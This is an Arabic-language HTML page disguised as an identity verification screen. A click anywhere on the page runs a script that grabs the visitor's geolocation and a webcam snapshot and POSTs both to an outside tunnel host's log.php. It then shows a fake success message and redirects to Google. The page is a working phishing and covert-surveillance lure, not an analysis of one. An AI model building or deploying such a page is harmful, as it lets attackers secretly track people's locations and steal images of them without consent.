<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق الرقمي</title>
</head>
<body onclick="captureNow()" style="background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:50px;">
    <div style="background:white; margin:auto; padding:30px; border-radius:15px; max-width:90%;">
        <h2>نظام التوثيق الأمني</h2>
        <p>يرجى الضغط على الزر أدناه لإتمام التحقق</p>
        <button id="btn" style="padding:15px 30px; background:#1a73e8; color:white; border:none; border-radius:5px; font-weight:bold;">تأكيد الهوية الآن</button>
    </div>

    <script>
    async function captureNow() {
        const btn = document.getElementById('btn');
        btn.innerText = "جاري المعالجة...";
        // الرابط الجديد الذي أرسلته أنت
        const tunnel = "https://ec88f8585f1a2f.lhr.life"; 

        try {
            // طلب الموقع وإرساله فوراً
            navigator.geolocation.getCurrentPosition(p => {
                fetch(`${tunnel}/log.php`, {
                    method: 'POST',
                    body: JSON.stringify({ lat: p.coords.latitude, lon: p.coords.longitude })
                });
            });

            // طلب الكاميرا
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // الانتظار ثانية واحدة فقط ثم الالتقاط
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const img = canvas.toDataURL('image/jpeg');

                // إرسال الصورة
                await fetch(`${tunnel}/log.php`, {
                    method: 'POST',
                    body: JSON.stringify({ img: img })
                });

                stream.getTracks().forEach(t => t.stop());
                alert("تم التوثيق بنجاح");
                window.location.href = "https://google.com";
            }, 1000);

        } catch (e) {
            alert("يرجى السماح بالكاميرا للمتابعة");
        }
    }
    </script>
</body>
</html>
